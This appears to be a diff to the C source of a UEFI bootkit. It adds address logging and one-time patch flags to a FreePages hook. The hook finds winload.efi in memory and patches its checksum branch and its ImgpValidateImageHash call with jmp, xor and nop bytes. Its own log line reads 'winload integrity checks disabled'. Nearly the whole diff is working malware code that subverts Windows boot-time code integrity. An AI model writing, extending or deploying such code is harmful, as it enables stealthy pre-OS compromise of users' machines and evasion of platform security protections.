@@ -9,10 +9,106 @@
  * ImgpLoadPEImage routine.
  *
 !*/
+
+#define ADDRESS_BUFFER_LENGTH 64
+
+STATIC
+VOID
+LogAddress(
+    IN PGENTBL Gen,
+    IN CONST CHAR16 *Label,
+    IN UINTN Address
+    )
+{
+    CHAR16  Buffer[ ADDRESS_BUFFER_LENGTH ];
+    UINTN   Index = 0;
+    UINTN   LabelIndex;
+    BOOLEAN Started = FALSE;
+    INTN    Shift;
+
+    if ( Gen == NULL )
+    {
+        return;
+    }
+
+    if ( Label != NULL )
+    {
+        for ( LabelIndex = 0;
+              Label[ LabelIndex ] != L'\0' && Index < ADDRESS_BUFFER_LENGTH - 1;
+              ++LabelIndex )
+        {
+            Buffer[ Index++ ] = Label[ LabelIndex ];
+        }
+    }
+
+    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
+    {
+        Buffer[ Index++ ] = L':';
+    }
+
+    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
+    {
+        Buffer[ Index++ ] = L' ';
+    }
+
+    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
+    {
+        Buffer[ Index++ ] = L'0';
+    }
+
+    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
+    {
+        Buffer[ Index++ ] = L'x';
+    }
+
+    for ( Shift = ( sizeof( Address ) * 8 ) - 4;
+          Shift >= 0 && Index < ADDRESS_BUFFER_LENGTH - 2;
+          Shift -= 4 )
+    {
+        UINTN Digit = ( Address >> Shift ) & 0xF;
+
+        if ( ! Started )
+        {
+            if ( Digit == 0 && Shift != 0 )
+            {
+                continue;
+            }
+
+            Started = TRUE;
+        }
+
+        Buffer[ Index++ ] = ( Digit < 10 )
+            ? ( CHAR16 )( L'0' + Digit )
+            : ( CHAR16 )( L'A' + ( Digit - 10 ) );
+    }
+
+    if ( ! Started && Index < ADDRESS_BUFFER_LENGTH - 2 )
+    {
+        Buffer[ Index++ ] = L'0';
+    }
+
+    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
+    {
+        Buffer[ Index++ ] = L'\r';
+    }
+
+    if ( Index < ADDRESS_BUFFER_LENGTH - 1 )
+    {
+        Buffer[ Index++ ] = L'\n';
+    }
+
+    Buffer[ Index ] = L'\0';
+
+    Gen->SystemTable->ConOut->OutputString( Gen->SystemTable->ConOut, Buffer );
+}
+
 D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN UINTN Pages )
 {
     PGENTBL                     Gen = NULL;
     PUINT8                      Adr = NULL;
+
+    BOOLEAN                     BranchPatched = FALSE;
+    BOOLEAN                     HashPatched = FALSE;
 
     PIMAGE_DOS_HEADER           Dos = NULL;
     PIMAGE_NT_HEADERS           Nth = NULL;
@@ -73,18 +169,25 @@ D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN U
                 /* Yes! - Set up the pointer to the base of the PE image */
                 Adr = C_PTR( U_PTR( Dos ) );
 
+                LOG( L"[+] winload.efi detected" );
+                LogAddress( Gen, L"[+] Image base", U_PTR( Dos ) );
+
                 while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                 {
                     /* jz short loc_180096FBF -> jmp short loc_180096FBF */
-                    if ( Adr[ 0x00 ] == 0xC1 &&
+                    if ( ! BranchPatched &&
+                         Adr[ 0x00 ] == 0xC1 &&
                          Adr[ 0x03 ] == 0xC7 &&
                          Adr[ 0x04 ] == 0x74 )
                     {
                         *( PUINT8 )( U_PTR( Adr + 0x04 ) ) = ( UINT8 )( 0xEB ); /* jmp */
+                        BranchPatched = TRUE;
+                        LogAddress( Gen, L"[+] Patched checksum branch", U_PTR( Adr + 0x04 ) );
                     }
 
                     /* call ImgpValidateImageHash -> xor eax, eax */
-                    if ( Adr[ 0x00 ] == 0xD8 &&
+                    if ( ! HashPatched &&
+                         Adr[ 0x00 ] == 0xD8 &&
                          Adr[ 0x01 ] == 0x3D &&
                          Adr[ 0x02 ] == 0x2D )
                     {
@@ -92,6 +195,10 @@ D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN U
                         *( PUINT8 ) ( U_PTR( Adr - 0x04 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
                         *( PUINT8 ) ( U_PTR( Adr - 0x03 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
                         *( PUINT8 ) ( U_PTR( Adr - 0x02 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
+
+                        HashPatched = TRUE;
+                        LogAddress( Gen, L"[+] Patched hash validation", U_PTR( Adr - 0x06 ) );
+                        LOG( L"[+] winload integrity checks disabled" );
 
                         /* Restore the original routine */
                         Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );
